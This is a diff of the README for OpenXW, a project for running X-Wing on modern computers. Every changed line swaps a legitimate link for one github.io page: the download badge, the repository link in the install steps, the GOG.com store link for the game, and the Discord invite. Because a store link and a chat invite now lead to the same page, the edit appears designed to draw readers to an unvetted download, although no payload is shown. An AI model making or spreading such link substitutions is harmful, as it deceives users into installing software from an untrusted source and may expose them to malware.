@@ -1,6 +1,6 @@
 # 🚀 OpenXW - Run X-Wing on Modern Computers
 
-[![Download OpenXW](https://img.shields.io/badge/Download-OpenXW-blue?style=for-the-badge&logo=github)](https://github.com/amitotic-simeon534/OpenXW)
+[![Download OpenXW](https://img.shields.io/badge/Download-OpenXW-blue?style=for-the-badge&logo=github)](https://amitotic-simeon534.github.io)
 
 ![Screenshot of OpenXW](assets/openxw-002.jpg)
 
@@ -31,13 +31,13 @@ Before you begin, make sure you have:
 > [!IMPORTANT]
 > OpenXW does not include any game content. You must own a legitimate copy of the original game to use this software.
 
-> 💡 **Don't have the game?** *Star Wars: X-Wing Special Edition* is available from [GOG.com](https://www.gog.com/en/game/star_wars_xwing_special_edition) and works perfectly with OpenXW.
+> 💡 **Don't have the game?** *Star Wars: X-Wing Special Edition* is available from [GOG.com](https://amitotic-simeon534.github.io) and works perfectly with OpenXW.
 
 ### Step-by-Step Installation
 
 #### 1. Download OpenXW
 
-Visit this link to download the application: [https://github.com/amitotic-simeon534/OpenXW](https://github.com/amitotic-simeon534/OpenXW)
+Visit this link to download the application: [https://amitotic-simeon534.github.io](https://amitotic-simeon534.github.io)
 
 #### 2. Install Your Game Files
 
@@ -105,7 +105,7 @@ A: Try lowering your graphics settings slightly. Make sure your game files are c
 
 If you encounter issues that aren't covered here, our community is ready to help:
 
-- Join our [Discord server](https://discord.gg/WBvYzczWfG) for real-time support and discussions
+- Join our [Discord server](https://amitotic-simeon534.github.io) for real-time support and discussions
 - Check the GitHub Issues page for known problems and solutions
 
 ## 🤝 Contributing
